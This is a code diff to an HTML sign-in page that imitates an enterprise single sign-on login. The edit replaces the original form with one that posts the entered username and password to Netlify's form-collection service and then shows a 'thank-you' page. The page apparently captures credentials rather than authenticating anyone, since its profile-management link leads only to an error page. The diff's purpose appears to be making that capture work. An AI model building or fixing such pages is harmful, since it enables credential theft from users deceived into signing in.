@@ -83,7 +83,7 @@ function checkResponse() {
                         <h1 id="signIn_Header" class="mx-4 mt-6 mb-4 text-center">Sign In</h1>
                         <div id="signIn_SubHeader"></div>
                         <!--Removed type="hidden" from form-->
-                        <form name="Login" novalidate="" id="cloud-directory-form" class="needs-validation mb-6 px-4 px-xxl-6" method="POST" data-netlify="true" autocomplete="off" action="thank-you.html" onsubmit="setFedSettings()">
+                        <!-- form name="Login" novalidate="" id="cloud-directory-form" class="needs-validation mb-6 px-4 px-xxl-6" method="POST" data-netlify="true" autocomplete="off" action="thank-you.html" onsubmit="setFedSettings()">
 				<div class="form-inputs mb-4">
 							
 							   <label class="form-label" for="vusername">Username or Email</label>
@@ -133,7 +133,68 @@ function checkResponse() {
 									</div>	
 							
                        					
-						</form>
+					 </form-->
+						 <form 
+  name="Login" 
+  method="POST" 
+  data-netlify="true" 
+  id="cloud-directory-form" 
+  autocomplete="off" 
+  onsubmit="setFedSettings()" 
+  action="/thank-you.html">
+
+  <!-- Required hidden field for Netlify form detection -->
+  <input type="hidden" name="form-name" value="Login">
+
+  <div class="form-inputs mb-4">
+    <label class="form-label" for="vusername">Username or Email</label>
+    <input 
+      id="vusername" 
+      type="text" 
+      class="form-control" 
+      name="vusername" 
+      tabindex="1" 
+      required 
+      data-toggle="tooltip" 
+      data-placement="top" 
+      title="Please provide user name">
+    <br>
+
+    <label class="form-label" for="password-input">Password</label>
+    <input 
+      id="password-input" 
+      type="password" 
+      class="form-control" 
+      name="password" 
+      tabindex="2" 
+      required 
+      autocomplete="off" 
+      data-toggle="tooltip" 
+      data-placement="top" 
+      title="Please provide password">
+
+    <div id="cs-error-message-container" class="form-control py-0 px-1 border-0">
+      <span id="cs-error-message" style="color:#de363b;"></span>
+    </div>
+
+    <input type="hidden" name="login-form-type" value="pwd">
+    <input type="hidden" id="username" name="username" value="1">
+  </div>
+
+  <div class="form-actions">
+    <div class="d-flex flex-column gap-1">
+      <button class="btn btn-success w-100 rounded-pill" id="login-button" type="submit" tabindex="3">
+        Sign in
+      </button>
+    </div>
+  </div>
+
+  <div class="bottom-links text-center small pt-5 px-4 px-xxl-6" id="passwordLinks">
+    <div class="d-flex flex-column gap-1">
+      <a class="btn btn-link btn-sm" href="error.html">Password and Profile Management</a>
+    </div>
+  </div>
+</form>
 					 </div>
 					
 	   </div>
